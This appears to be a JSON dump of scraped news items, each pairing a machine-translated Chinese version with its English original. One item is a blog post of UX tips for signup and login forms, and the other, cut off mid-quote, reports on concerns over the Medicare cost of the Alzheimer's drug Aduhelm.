[{"category": "", "categoryclass": "", "imagename": "", "infoid": 1068420, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u597d\u7684\uff0c\u6211\u8ba8\u538c\u957f\u65f6\u95f4\u7684\u4e60\u60ef\uff0c\u6240\u4ee5\uff1a\u8fd9\u662f\u4e00\u4e9b\u6700\u91cd\u8981\u7684UX\u63d0\u793a\u7684\u6e05\u5355\uff0c\u7528\u4e8e\u521b\u5efa\u53ef\u7528\u7684\u6ce8\u518c\u548c\u767b\u5f55\u8868\u5355\u3002\u5b83\u6839\u636e\u6211\u7684\u7ecf\u9a8c\uff0c\u770b\u7740\u6570\u767e\u540d\u5f00\u59cb\u8bbe\u8ba1\u5e08\u767b\u5f55\u6d41\u7a0b\uff0c\u611f\u8c22\u6211\u7684\u8bfe\u7a0b\u5b66\u4e60UI\u8bbe\u8ba1\u5e76\u5b66\u4e60UX\u8bbe\u8ba1\u3002\n   \u5177\u6709\u8bbd\u523a\u610f\u5473\u7684\u662f\uff0c\u4ea4\u4e92\u8bbe\u8ba1\u7684\u57fa\u672c\u89c4\u5219\u662f\uff1a\u53bb\u9664\u4ea4\u4e92\u3002\u5220\u9664\u5355\u51fb\uff0c\u5220\u9664\u8bfb\u53d6\uff0c\u5220\u9664\u7b49\u5f85\uff0c\u5220\u9664\u601d\u7ef4\u3002\n \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a\u5982\u679c\u60a8\u77e5\u9053\uff0c\u4ece\u5b57\u9762\u4e0a95\uff05\u7684\u4eba\u6253\u5f00\u6ce8\u518c\u8868\u5355\u5c06\u7acb\u5373\u70b9\u51fb\u7b2c\u4e00\u4e2a\u5b57\u6bb5\uff0c\u4fdd\u5b58\u5b83\u4eec\u7684\u6545\u969c\u5e76\u81ea\u52a8\u5173\u6ce8\u5b83\u3002\n   \u751f\u6d3b\u4e2d\u552f\u4e00\u7684\u4e8b\u60c5\u662f\uff08a\uff09\u6b7b\u4ea1\u548c\uff08b\uff09\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u6709\u4e00\u4e2a\u201c@\u201d\u548c\u201c\u3002\u201d\u5728\u4ed6\u4eec\u4e4b\u4e2d\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u79fb\u52a8\u7535\u8bdd\u5177\u6709\u4e13\u95e8\u7684\u7535\u5b50\u90ae\u4ef6\u8f93\u5165\u952e\u76d8\uff0c\u663e\u793a\u8fd9\u4e9b\u5b57\u7b26 - \u4f46\u60a8\u5fc5\u987b\u5728HTML\u4e2d\u6807\u8bb0\u60a8\u7684TextBox\u7c7b\u578b=\u7535\u5b50\u90ae\u4ef6\u3002\u8fd9\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u53d8\u5316\uff0c\u4f7f\u79fb\u52a8\u7528\u6237\u7684\u751f\u6d3b\u66f4\u5bb9\u6613\u3002\n \u6ce8\u610f\uff1a\u4e5f\u9002\u7528\u4e8e\u7535\u8bdd\u53f7\u7801\uff08\u7c7b\u578b= TEL\uff09\uff0cURL\uff08\u7c7b\u578b= URL\uff09\u548c\u6ce8\u518c\u6d41\u4e2d\u7684\u6570\u5b57\uff08\u7c7b\u578b= NUM\u200b\u200b\uff09\u3002\n   \u5728\u6307\u51fa\u4efb\u4f55\u9519\u8bef\u4e4b\u524d\uff0c\u800c\u4e0d\u662f\u7b49\u5f85\u7528\u6237\u586b\u5199\u6574\u4e2a\u8868\u5355\uff0c\u800c\u4e14\u53ea\u8981\u60a8\u7684\u7cfb\u7edf\u53ef\u4ee5\u544a\u8bc9\u4ed6\u4eec\u6709\u9519\u8bef\uff0c\u5c31\u4f1a\u8ba9\u4ed6\u4eec\u77e5\u9053\u3002\u5bf9\u4e8e\u50cf\u7535\u5b50\u90ae\u4ef6\u4e00\u6837\u7684\u4e1c\u897f\uff0c\u9a8c\u8bc1\u6a21\u7cca\uff08\u5373\uff0c\u5f53\u4ed6\u4eec\u4e13\u6ce8\u4e8e\u53e6\u4e00\u4e2a\u5b57\u6bb5\uff09\u662f\u6709\u610f\u4e49\u7684\u3002\n \u901a\u5e38\uff0c\u6211\u4f1a\u5c1d\u8bd5\u6355\u83b7\u7a7a\u767d\u4ee5\u53ca\u65e0\u6548\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002 \n\u60a8\u521b\u5efa\u7684\u6bcf\u4e00\u4e2a\u6807\u8bb0\u7684\u6587\u672c\u8f93\u5165\u90fd\u5e94\u8be5\u6709\u53ef\u70b9\u51fb\u7684\u6807\u7b7e\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e0d\u662f\u7531HTML\u5b8c\u6210\u7684\u5947\u8ff9\uff0c\u4f46\u53ea\u9700\u5728\u5176\u5404\u81ea\u7684\u6807\u7b7e\u5143\u7d20\u4e2d\u6dfb\u52a0\u8f93\u5165\u5143\u7d20\uff0c\u60a8\u5c31\u4f1a\u5f88\u597d\u3002\u8fd9\u4e0d\u662f\u5417\uff08a\uff09\u5141\u8bb8\u6211\u7f3a\u5e2d\u5730\u5355\u51fb\u6807\u7b7e\u4ee5\u5f00\u59cb\u952e\u5165\uff0c\u4f46\uff08b\uff09\u5b83\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u6211\uff0c\u5982\u679c\u6211\u7684\u7b28\u62d9\u7684\u624b\u6307\u7a0d\u5fae\u4e0d\u5c0f\u5fc3\u9519\u8fc7\u6587\u672c\u6846\u3002\n   \u6ca1\u6709\u7528\u6237\u5e94\u8be5\u731c\u6d4b\u5bc6\u7801\u8981\u6c42\u7684\u8981\u6c42\u3002\u5f53\u5b83\u4eec\u76f8\u5173\u65f6\u5411\u4ed6\u4eec\u5c55\u793a\uff08P.S.\u5e76\u5728\u4e0d\u662f\u65f6\u5220\u9664\u5b83\u4eec\uff09\u3002\n   \u5141\u8bb8\u7528\u6237\u67e5\u770b\u4ed6\u4eec\u8f93\u5165\u7684\u5bc6\u7801\u5c06\u963b\u6b62Thorny UX\u95ee\u9898\u9009\u62e9\u5b83\u4eec\u5e76\u4e0d\u610f\u5473\u7740 - \u540c\u65f6\u4e5f\u4e0d\u592a\u7e41\u91cd\uff0c\u800c\u4e0d\u662f\u8981\u6c42\u5b83\u4eec\u952e\u5165\u4e24\u6b21\u3002\n    \u4f60\u60f3\u8981\u4f60\u7684\u767b\u5f55\u662f\u5982\u6b64\u7b80\u5355\uff0c\u6751\u91cc\u7684\u767d\u75f4\u4ecd\u7136\u53ef\u4ee5\u5728\u4e0d\u601d\u8003\u7684\u60c5\u51b5\u4e0b\u7761\u4e00\u534a\u7761\u7740\u4e86\u3002\n \u5bf9\u4e8e\u90a3\u4e9b\u7ed3\u5c40\uff0c\u4e0d\u8981\u4f7f\u7528\uff0c\u8bf4\uff0c\u201c\u767b\u5f55\u201d\u548c\u201c\u6ce8\u518c\u201d - \u8fd9\u9700\u8981\u6211\u601d\u8003\u4e00\u4e0b\u6211\u662f\u5426\u60f3\u8981\u201c\u5728\u201d\u6216\u201c\u5411\u4e0a\u201d\u3002\n \u76f8\u53cd\uff0c\u4f7f\u7528\u201c\u6ce8\u518c\u201d\u4e0e\u201c\u767b\u5f55\u201d\u7b49\u9009\u9879\uff0c\u6216\u8005\u5206\u5f00\u8d85\u8fc72\u4e2a\u5b57\u6bcd\u7684\u5176\u4ed6\u9009\u9879\u3002\u5b83\u53ef\u80fd\u53ea\u4fdd\u5b58\u4e00\u534a\u7684\u7528\u6237\uff0c\u4f46\u5982\u679c\u60a8\u73b0\u5728\u4e0d\u4f1a\u5c06\u5b83\u4eec\u4fdd\u5b58\u534a\u79d2\uff0c\u90a3\u4e48\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u5176\u4f59\u90e8\u5206\u5e76\u4e0d\u64c5\u957f\u3002\n   \u5728\u67d0\u4eba\u70b9\u51fb\u9519\u8bef\u7684\u9009\u9879\u7684\u60c5\u51b5\u4e0b\uff0c\u60a8\u5e0c\u671b\u5b83\u80fd\u591f\u5bf9\u5b83\u4eec\u5207\u6362\u5230\u6ce8\u518c\u548c\u767b\u5f55 - \u53cd\u4e4b\u4ea6\u7136\u3002 \n\u6700\u5e38\u89c1\u7684\u662f\uff0c\u8fd9\u5c06\u663e\u793a\u4e3a\u94fe\u63a5\uff08\u4e0d\u662f\u6309\u94ae - \u4e00\u4e2a\u9519\u8bef\u7684\u5f00\u59cb\u8bbe\u8ba1\u5e08\u7ecf\u5e38\u5236\u4f5c\uff09\u4f4d\u4e8e\u8868\u5355\u5e95\u90e8\u3002\n   \u7528\u6237\u540d\u96be\u4ee5\u8bb0\u4f4f\u6bcf\u4e2a\u5355\u72ec\u7684\u670d\u52a1\uff0c\u5e76\u4e14\u60a8\u53ef\u80fd\u5df2\u88ab\u8feb\u9664\u4e86\u60a8\u901a\u5e38\u7684\u60ef\u4f8b\u3002\u7535\u5b50\u90ae\u4ef6\u662f\u4e00\u79cd\u66f4\u5bb9\u6613\u767b\u5f55\u7684\u65b9\u6cd5\u3002\n   \u5982\u679c\u7528\u6237\u731c\u6d4b\uff08a\uff09\u9519\u8bef\u7684\u5bc6\u7801\uff0c\u5e76\u4e14\uff08b\uff09\u4e0d\u7b26\u5408\u5bc6\u7801\u8981\u6c42\uff0c\u8bf7\u8bf4\u51fa\u5bc6\u7801\u672a\u80fd\u6ee1\u8db3\u7684\u8981\u6c42\u3002\u6bd4\u8bf4\u201c\u4e0d\u6b63\u786e\u7684\u5bc6\u7801\u201d\u66f4\u6709\u7528\uff0c\u4f46\u4e0d\u4f1a\u5411\u7528\u6237\u63d0\u4f9b\u5982\u4f55\u89e3\u51b3\u5b83\u4eec\u7684\u7ebf\u7d22\u3002\n   \u901a\u5e38\uff0c\u5982\u679c\u60a8\u5355\u51fb\u201c\u5fd8\u8bb0\u5bc6\u7801\u201d\uff0c\u60a8\u5c06\u88ab\u8feb\u91cd\u65b0\u8f93\u5165\u60a8\u4e4b\u524d\u4ec530\u79d2\u7684\u7535\u5b50\u90ae\u4ef6\u3002\u5f53\u7528\u6237\u5728\u4ed6\u4eec\u7684\u5bc6\u7801\u8017\u5c3d\u5e76\u60f3\u8981\u91cd\u7f6e\u65f6\u8017\u5c3d\u4e86\u4ed6\u4eec\u7684\u731c\u6d4b\uff0c\u4e0d\u8981\u7ea0\u7f20\u4ed6\u4eec\u7684\u4fe1\u606f\u3002\n   \u4ece\u5f00\u59cb\u8bbe\u8ba1\u4eba\u5458\u770b\u4e00\u4e0b\u6570\u767e\u4e2a\u6ce8\u518c\u6d41\uff0c\u8fd9\u4e9b\u63d0\u793a\u89e3\u51b3\u4e86\u6211\u770b\u5230\u7684\u4e00\u4e9b\u6700\u5e38\u89c1\u7684\u95ee\u9898\u3002\u5b9e\u65bd\u6240\u6709\u8fd9\u4e9b\uff0c\u60a8\u5c06\u6709\u4e00\u4e2a\u767b\u5f55UX\uff0c\u8fd9\u6548\u679c\u5f88\u597d\uff0c\u5982\u7a7a\u6c14\u3002\n \u8bf7\u8bb0\u4f4f\uff1a\u6ca1\u6709\u4eba\u6765\u5230\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u767b\u5f55\u3002\u54ce\u5440\uff0c\u4ed6\u4eec\u751a\u81f3\u53ef\u80fd\u751a\u81f3\u6ca1\u6709\u6765\u4f7f\u7528\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u5728\u6240\u6709\u53ef\u80fd\u6027\u4e2d\uff0c\u9664\u975e\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u5a31\u4e50\uff0c\u5927\u591a\u6570\u7528\u6237\u53ef\u80fd\u5e0c\u671b\u4f7f\u7528\u5b83\u5c3d\u5feb\u5b9e\u73b0\u7279\u5b9a\u76ee\u6807\uff0c\u7136\u540e\u7ee7\u7eed\u4ed6\u4eec\u7684\u751f\u6d3b\u3002\n \u4f5c\u4e3a\u826f\u597d\u7684UX\u8bbe\u8ba1\u5e08\uff0c\u8ba9\u6211\u4eec\u5c0a\u91cd\u7528\u6237\u7684\u4e0d\u8010\u70e6\uff0c\u5e76\u4f7f\u8fd9\u79cd\u4e1c\u897f\u5c3d\u53ef\u80fd\u7b80\u5355\u3002 \n\u6211\u4f1a\u6d4f\u89c8\u4e00\u4e2aUI\u9879\u76ee\u7684\u6bcf\u4e2a\u90e8\u5206 - \u5c31\u50cf\u6211\u4e3a\u6765\u81ea\u8d22\u5bcc100\u5bb6\u516c\u53f8\u7684\u6bcf\u4e2a\u4eba\u90fd\u5b8c\u6210\u4e86y-combinator\u521d\u521b\u516c\u53f8\u3002  \u6211\u4eec\u4f7f\u7528\u6b64\u5b57\u6bb5\u6765\u68c0\u6d4b\u5783\u573e\u90ae\u4ef6\u673a\u5668\u4eba\u3002 \u5982\u679c\u60a8\u586b\u5199\u6b64\u5185\u5bb9\uff0c\u60a8\u5c06\u88ab\u6807\u8bb0\u4e3a\u5783\u573e\u90ae\u4ef6\u53d1\u9001\u8005\u3002 ", "note_en": "OK, I hate long intros, so: this is a checklist of some of the  most important UX tips for creating usable signup and login forms. It\u2019s based on my experience looking at hundreds of beginning designer login flows, thanks to my courses  Learn UI Design and  Learn UX Design.\n   Ironically, the fundamental rule of interaction design is:  remove interaction. Remove clicks, remove reading, remove waiting, remove thinking.\n An easy example: if you know that  literally 95% of people opening a signup form will  immediately click into the first field,  save them the trouble and auto-focus on it.\n   The only things certain in life are (a) death and (b) email addresses have an \u201c@\u201d and a \u201c.\u201d in them. Fortunately, mobile phones have specialized email entry keyboards showing those characters \u2013 but you must label your textbox  type=email in HTML. This is such a simple change to make mobile users\u2019 lives easier.\n Note: also applies to telephone numbers ( type=tel), URLs ( type=url), and numbers ( type=num) in your signup flow.\n   Rather than waiting for the user to fill out  the entire form before you point out any errors, let them know  as soon as your system can tell there\u2019s an error. For something like email, it makes sense to validate on  blur (that is, when they focus on another field).\n Typically I\u2019d try to catch both  blank as well as  invalid email addresses.\n   Every single labelled text input you ever create should have clickable labels. It\u2019s a wonder this isn\u2019t done by HTML by default, but simply add the input element inside its respective label element and you\u2019re good to go. Not only does this (a) allow me to absentmindedly click the label to start typing, but (b) it also helps me if my clumsy finger accidentally misses the textbox by a bit.\n   No user should have to guess at what the password requirements are. Show them  when they\u2019re relevant (P.S. And remove them when they\u2019re not).\n   Allowing users to  view the password they\u2019ve entered will prevent thorny UX issues with choosing a password they didn\u2019t mean to \u2013 while also being less onerous than requiring them to type it twice.\n    You want your sign-in to be so simple, the village idiot could still complete it half asleep without thinking.\n To those ends, don\u2019t use, say, \u201cSign in\u201d and \u201cSign up\u201d \u2013 which requires me to think for half a second whether I want \u201cin\u201d or \u201cup\u201d.\n Instead, go with options like \u201cRegister\u201d vs. \u201cSign in\u201d, or other pairs of options that are more than 2 letters apart. It may only save your users a half a second, but if you wouldn\u2019t save them half a second  now, it\u2019s not looking good for the rest of your app \ud83d\ude2c.\n   In the case that someone  does click the wrong option, you want it to be dead simple for them to switch from registration and logging in \u2013 and vice versa.\n Most commonly, this is displayed as a link ( not a button\u00a0\u2013\u00a0a mistake beginning designers make weirdly often) located at the  bottom of the form.\n   Usernames are tough to remember for every individual service, and you may have been forced to pick something besides your usual. Emails are a much easier way to log in.\n   If the user guesses a password that\u2019s both (a) wrong and (b) doesn\u2019t meet the password requirements, say which requirement the password failed to meet. Much more useful than saying \u201cincorrect password\u201d, but not giving the user a clue as to how they might fix it.\n   Far too often, if you click \u201cForgot password\u201d, you\u2019ll be forced to re-enter an email you typed just 30 seconds before. By the time the user has exhausted their guesses at their password and wants to reset, don\u2019t pester them for information you already know.\n   Having looked at hundreds of signup flows from beginning designers, these tips address some of the most frequent problems I see. Implement all of them, and you\u2019ll have a login UX that feels, well, as noticeable as air.\n Remember: no one came to your app to log in. Heck, they probably didn\u2019t even come to use your app for its own sake. In all likelihood, unless your app is for entertainment, most users probably want to use it to achieve a specific goal  as quickly as possible, then get on with their life.\n As good UX designers, let\u2019s honor our users\u2019 impatience and make this stuff as simple as possible.\n  I\u2019ll walk you through  every part of a UI project \u2014 just like I\u2019ve done for everyone from  Fortune 100 companies to  Y-Combinator startups.\n    We use this field to detect spam bots. If you fill this in, you will be marked as a spammer.", "posttime": "2021-06-29 22:26:02", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u767b\u5f55,signup", "title": "\u66f4\u597d\u5730\u6ce8\u518c/\u767b\u5f55UX\u7684\u63d0\u793a ", "title_en": "Tips for Better Signup / Login UX", "transed": 1, "url": "https://learnui.design/blog/tips-signup-login-ux.html", "via": "", "real_tags": ["\u767b\u5f55", "signup"]}, {"category": "", "categoryclass": "", "imagename": "297563d4e74c78419181fb64c3883a69.jpeg", "infoid": 1068419, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5173\u6ce8\u5728\u4e89\u8bae\u7684\u65b0\u963f\u5c14\u8328\u6d77\u9ed8\u6c0f\u836f\u7269Aduhelm\u7684\u4ef7\u683c\u4e0a\u5b89\u88c5\u3002\u5021\u5bfc\u8005\uff0c\u7acb\u6cd5\u8005\u548c\u6279\u8bc4\u8005\u7279\u522b\u62c5\u5fc3\u836f\u7269\u768456,000\u7f8e\u5143\u7684\u6bcf\u5e74\u540d\u5355\u4ef7\u683c\u5c06\u4e3aMedicare\u62c5\u5fc3\u3002\u8054\u90a6\u4fdd\u9669\u65b9\u6848\u53ef\u4f9b65\u5c81\u53ca\u4ee5\u4e0a\uff0c\u6db5\u76d6\u7f8e\u56fd\u963f\u5c14\u8328\u6d77\u9ed8\u6c0f\u75c7\u5927\u7ea6600\u4e07\u6210\u5e74\u4eba\u3002\n \u6b63\u5982\u5b83\u6240\u8bf4\uff0cAduhelm-A\u533b\u751f\u9759\u8109\u5185\u836f\u7269\u7684\u6210\u672c - \u6709\u6f5c\u5728\u7684\u6f5c\u5728\u5174\u8d77\u7684\u91d1\u989d\u5728\u6240\u6709\u5176\u4ed6\u533b\u751f\u7ed9\u836f\u548c\u96f6\u552e\u5904\u65b9\u836f\u4e2d\u82b1\u8d39\u7684\u91d1\u989d\u3002\n \u98df\u54c1\u548c\u836f\u7269\u7ba1\u7406\u5c40\u672c\u6708\u65e9\u4e9b\u65f6\u5019\u6279\u51c6\u4e86Aduhelm\uff0c\u5f15\u53d1\u4e86\u5e7f\u6cdb\u548c\u5f3a\u70c8\u7684\u6279\u8bc4\u3002\u4e13\u5bb6\u548c\u884c\u4e1a\u89c2\u5bdf\u8005\u79f0\u4e4b\u4e3a\u201c\u53ef\u803b\u201d\u548c\u201c\u5371\u9669\u201d\u51b3\u5b9a\uff0c\u6ce8\u610f\u5230Aduhelm\u7684\u4e34\u5e8a\u8bd5\u9a8c\u6ca1\u6709\u6e05\u695a\u5730\u8868\u660e\u8be5\u836f\u5b9e\u9645\u4e0a\u5728\u6cbb\u7597\u963f\u5c14\u8328\u6d77\u9ed8\u6c0f\u75c7\u7684\u60c5\u51b5\u4e0b\u3002\u4e8b\u5b9e\u4e0a\uff0cAduhelm\u7684\u5236\u9020\u5546Biogen\uff0c\u8bbe\u5b9a\u4e86\u5982\u6b64\u9ad8\u7684\u5217\u8868\u4ef7\u683c\u53ea\u52a0\u5f3a\u4e86\u6279\u8bc4\u3002\n Kaiser\u5bb6\u65cf\u57fa\u91d1\u4f1a\u672c\u6708\u65e9\u4e9b\u65f6\u5019\u5206\u6790\u6307\u51fa\uff0c\u5982\u679c\u53ea\u9700\u56db\u5206\u4e4b\u4e00\u768425\u4e07\u533b\u7597\u4fdd\u9669\u53d7\u76ca\u4eba\uff0c\u76ee\u524d\u4f7f\u7528Alzheimer\u7684\u6cbb\u7597\u65b9\u6cd5 - \u6240\u4ee5500,000\u5c81\u6216So\u53d7\u76ca\u4eba - \u5f00\u59cb\u670d\u7528Aduhelm\uff0c\u5b83\u4f1a\u82b1\u8d39Medicare\u6bcf\u5e74\u4f30\u8ba1290\u4ebf\u7f8e\u5143\u3002 2019\u5e74\uff0c\u533b\u7597\u4fdd\u9669\u603b\u5171\u82b1\u4e86370\u4ebf\u7f8e\u5143\u7684\u533b\u751f\u836f\u7269\u3002\n \u661f\u671f\u4e00\u901a\u8fc7\u7edf\u8ba1\u53d1\u5e03\u7684\u4e00\u4e2a\u65b0\u5206\u6790\u5c06\u6570\u5b57\u8fdb\u4e00\u6b65\u63a8\u52a8\u3002\u51fa\u53e3\u636e\u4f30\u8ba1\uff0c\u5982\u679c\u6240\u6709580\u4e07\u56fd\u7acb\u533b\u7597\u4fdd\u9669\u6761\u4ef6\u7684\u6210\u5e74\u4eba\u5f00\u59cb\u670d\u7528Aduhelm\uff0c\u5b83\u53ef\u80fd\u6bcf\u5e74\u82b1\u8d393345\u4ebf\u7f8e\u5143\u3002\u636e\u79f0\uff0c3.345\u4ebf\u7f8e\u5143\u7684\u662f\u8fa9\u62a4\u90e8\u7684\u6574\u4e2a\u9884\u7b97\u7684\u4e00\u534a - \u6216\u7ea6400\u4e07\u7279\u65af\u62c9\u6a21\u578bXS\uff08\u5bf9\u4e8e\u90a3\u4e9b\u5728\u7279\u65af\u62c9\u65af\u601d\u8003\u7684\u4eba\uff09\u3002\u51fb\u7403\u603b\u91cf\u4e5f\u5927\u5927\u8d85\u51fa\u4e86Medicare\u5bf9\u533b\u751f\u7ba1\u7406\u548c\u96f6\u552e\u5904\u65b9\u836f\u7684\u652f\u51fa\uff0c\u8fd9\u4e9b\u836f\u7269\u5408\u5e76\uff0c2019\u5e74\u603b\u8ba1\u7ea6\u4e3a2200\u4ebf\u7f8e\u5143\u3002\n     \u5f53\u7136\uff0c\u8fd9\u662f\u4e0d\u53ef\u80fd\u9884\u6d4b\u6709\u591a\u5c11\u4eba\u5c06\u6700\u7ec8\u670d\u7528Aduhelm\u4ee5\u53ca\u4ed6\u4eec\u5c06\u575a\u6301\u6cbb\u7597\u591a\u4e45\u3002\u4f46\u8611\u83c7\u6210\u672c\u4f30\u8ba1\u5e76\u975e\u4e0d\u53ef\u80fd\u3002\u5728\u5176\u8bb8\u591a\u6709\u4e89\u8bae\u7684\u4e3e\u63aa\u4e2d\uff0cFDA\u6279\u51c6\u4e86Aduhelm\u5728\u6240\u6709\u963f\u5c14\u8328\u6d77\u9ed8\u6c0f\u75c7\u7684\u60a3\u8005\u4e2d\u4f7f\u7528\uff0c\u5373\u4f7f\u751f\u7269\u539f\u6027\u53ea\u6d4b\u8bd5\u4e86\u8f7b\u5ea6\u75be\u75c5\u7684\u4eba\u7684\u836f\u7269\u3002\u5c3d\u7ba1\u6570\u636e\u7f3a\u4e4f\u8d44\u91d1\u6570\u636e\uff0c\u4f46\u8bb8\u591a\u60a3\u8005\u90fd\u5e0c\u671b\u548c\u6e34\u671b\u5c1d\u8bd5\u8fd9\u79cd\u836f\u7269\u3002 Aduhelm\u662f\u8fd1\u4e8c\u5341\u5e74\u6765\u963f\u5c14\u8328\u6d77\u9ed8\u6c0f\u75c7\u7684\u7b2c\u4e00\u4e2a\u65b0\u6279\u51c6\u7684\u836f\u7269\u3002\n \u4f46\u6279\u8bc4\u8005\u8868\u793a\uff0c\u8be5\u836f\u7269\u53ea\u4f1a\u5728\u60a3\u8005\u53ca\u5176\u5bb6\u5c5e\u4e2d\u63d0\u51fa\u865a\u5047\u5e0c\u671b\uff0c\u4ee5\u53ca\u4fb5\u8680\u7684\u76d1\u7ba1\u6807\u51c6\u3002\u672c\u6708\u65e9\u4e9b\u65f6\u5019\uff0c\u4e00\u4e2a\u9886\u5148\u7684\u884c\u4e1a\u770b\u95e8\u72d7\u547c\u5401\u5728\u51b3\u5b9a\u6216\u88ab\u89e3\u96c7\u7684\u51b3\u5b9a\u80cc\u540e\u7684\u4e09\u4f4d\u9876\u7ea7FDA\u5b98\u5458\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u76d1\u7ba1\u673a\u6784\u7684\u4e09\u4f4d\u4e13\u5bb6\u987e\u95ee\u8f9e\u804c\u4e86\u4ed6\u4eec\u7684\u804c\u4f4d\u3002\u987e\u95ee\u662f11\u540d\u6210\u5458\u5c0f\u7ec4\u7684\u4e00\u90e8\u5206\uff0c\u8fd9\u662f\u53bb\u5e7411\u6708\u538b\u5012\u6027\u5730\u6295\u7968\u6279\u51c6\u3002 \n\u73b0\u5728\u7acb\u6cd5\u8005\u6b63\u5728\u91c7\u53d6\u4e89\u8bae\u7684\u836f\u7269\u91c7\u53d6\u884c\u52a8\u3002\u4e0a\u5468\uff0cSENS\u3002\u6bd4\u5c14\u5361\u897f\u8fea\uff0cMD\uff08R-LA\uff09\u548c\u4f0a\u4e3d\u838e\u767d\u6c83\u4f26\uff08D-MASS\u3002\uff09\u547c\u5401\u542c\u53d6\u201c\u5ba1\u67e5\u4ee4\u4eba\u70e6\u607c\u7684\u65b0\u95ee\u9898\u548c\u6311\u6218\u201dAduhelm\uff06\uff0339; S Medicare\u7684\u6279\u51c6\u63d0\u5347\u3002\u5468\u4e94\uff0c\u4f17\u8bae\u9662\u76d1\u7763\u548c\u6539\u9769\u59d4\u5458\u4f1a\u5ba3\u5e03\uff0c\u5b83\u6b63\u5728\u5bf9Aduhelm\u7684\u6279\u51c6\u548c\u5b9a\u4ef7\u8fdb\u884c\u8c03\u67e5\u3002\n \u201c\u6211\u4eec\u5bf9Biogen\u7684\u65b0\u963f\u5c14\u8328\u6d77\u9ed8\u6c0f\u836f\u7269Aduhelm\u7684\u9661\u5ced\u4ef7\u683c\u4ee5\u53ca\u5c3d\u7ba1\u6709\u5173\u4e8e\u836f\u7269\u7684\u4e34\u5e8a\u798f\u5229\u7684\u95ee\u9898\uff0c\u56e0\u6b64\u6279\u51c6\u7684\u8fc7\u7a0b\u4ee4\u4eba\u62c5\u5fe7\u7684\u662f\uff0cCarolyn Maloney\uff08DN.Y.\uff09\u548cFrank Pallone Jr.\uff08DN\u3002\u5728\u8054\u5408\u58f0\u660e\u4e2d\u8868\u793a\uff0c\u62c5\u4efb\u8c03\u67e5\u7684J.\uff09\u3002\n \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u751f\u7269\u539f\u6027\u548cFDA\u4f3c\u4e4e\u6b63\u5728\u6279\u8bc4\u8fdb\u6b65\u3002 Biogen Ceo Michel Vountsos\u634d\u536b\u7740\u5b9a\u4ef7\uff0c\u5728\u672c\u6708\u65e9\u4e9b\u65f6\u5019\u5728\u4e00\u6b21\u7535\u8bdd\u4f1a\u8bae\u4e0a\u8bf4\uff1a\u201c\u6211\u4eec\u8ba4\u4e3a\u4ef7\u683c\u662f\u7531\u9884\u671f\u7ed9\u60a3\u8005\uff0c\u770b\u62a4\u4eba\u548c\u793e\u4f1a\u5e26\u6765\u7684\u4ef7\u503c\u7684\u4ef7\u503c\u3002\u201d\u4e0e\u6b64\u540c\u65f6\uff0c\u4ee3\u7406FDA\u4e13\u5458Janet Woodcock\u544a\u8bc9\u7edf\u8ba1\u6570\u636e\uff0c\u5979\u53ea\u662f\u5173\u4e8e\u5f3a\u5316\u53cd\u5f39\u7684\u201c\u4e0d\u5173\u5fc3\u201d\u3002 ", "note_en": "Concern is mounting over the price of the controversial new Alzheimer\u2019s drug Aduhelm. Advocates, lawmakers, and critics worry in particular about what the drug\u2019s $56,000 per-year list price will do to Medicare. The federal insurance program is available to those age 65 and over, which covers the vast majority of the roughly 6 million adults with Alzheimer\u2019s in the US.\n As it stands, the cost of Aduhelm\u2014a doctor-administered intravenous drug\u2014has the potential to eclipse the amount of money Medicare spends on all other doctor-administered drugs  and retail prescription drugs, combined.\n The Food and Drug Administration granted approval of Aduhelm earlier this month, sparking widespread and intense criticism. Experts and industry watchers have called the decision  \u201cdisgraceful\u201d and \u201cdangerous,\u201d noting that clinical trials of Aduhelm did not clearly show that the drug is actually effective at treating Alzheimer\u2019s. The fact that Aduhelm\u2019s maker, Biogen, set the list price so high only intensified the criticism.\n An  analysis earlier this month by the Kaiser Family Foundation pointed out that if just a quarter of the 2 million Medicare beneficiaries who currently use an Alzheimer\u2019s treatment\u2014so 500,000 or so beneficiaries\u2014begin taking Aduhelm, it would cost Medicare an estimated $29 billion a year. In 2019, Medicare spent $37 billion on all doctor-administered drugs, total.\n A new analysis released Monday by Stat pushed the numbers further. The outlet estimated that if all 5.8 million Medicare-eligible adults with Alzheimer\u2019s began taking Aduhelm, it could cost Medicare $334.5 billion a year. Stat noted that $334.5 billion is nearly half of the entire budget for the Department of Defense\u2014or about 4 million Tesla Model Xs (for those who think in terms of Teslas). The eye-popping total also significantly exceeds Medicare\u2019s spending on doctor-administered and retail prescription drugs combined, which totaled about $220 billion in 2019.\n     It\u2019s, of course, impossible to predict just how many people will end up taking Aduhelm and how long they\u2019ll stick to the treatment. But the mushrooming cost estimates are not out of the question. Among its many controversial moves, the FDA approved Aduhelm for use in all Alzheimer\u2019s patients even though Biogen only tested the drug in people with mild disease. And despite the lack of efficacy data, many patients are hopeful and eager to try the drug. Aduhelm is the first newly approved drug for Alzheimer\u2019s in nearly two decades.\n But critics say the drug has only raised false hope among patients and their families, as well as eroded regulatory standards. Earlier this month, a leading industry watchdog called for  three top FDA officials behind the decision to resign or be fired. Meanwhile,  three expert advisers to the regulator resigned their posts in protest. The advisers were part of an 11-member panel that overwhelmingly voted against approval last November.\n Now lawmakers are taking action on the contentious drug. Last week, Sens. Bill Cassidy, MD (R-La.) and Elizabeth Warren (D-Mass.)  called for a hearing to \u201cexamine the vexing new questions and challenges\u201d Aduhelm&#39;s approval raises for Medicare. And on Friday, the House Committee on Oversight and Reform announced that it is  opening an investigation into Aduhelm\u2019s approval and pricing.\n \u201cWe have serious concerns about the steep price of Biogen\u2019s new Alzheimer\u2019s 